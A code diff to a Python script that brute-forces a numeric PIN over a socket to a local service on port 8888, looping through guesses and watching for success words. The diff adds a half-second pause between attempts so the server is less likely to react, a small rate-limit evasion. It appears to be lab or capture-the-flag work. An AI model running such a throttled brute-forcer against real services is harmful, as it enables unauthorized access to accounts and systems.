@@ -1,4 +1,5 @@
 import socket
+import time  # so we can slow down a bit
 
 HOST = '127.0.0.1'
 PORT = 8888
@@ -31,7 +32,6 @@ for i in range(1000):
 
         output = result.decode(errors="ignore")
 
-        # look for a keyword that signals correct pin
         if "Success" in output or "Welcome" in output or "Correct" in output:
             print(f"[🎉] PIN FOUND: {guess}")
             break
@@ -39,6 +39,9 @@ for i in range(1000):
             print(f"Try {guess} -> no luck")
 
         sock.close()
+
+        # wait a bit so server doesn't freak out lol
+        time.sleep(0.5)
 
     except Exception as err:
         print(f"[x] pin {guess} failed: {err}")
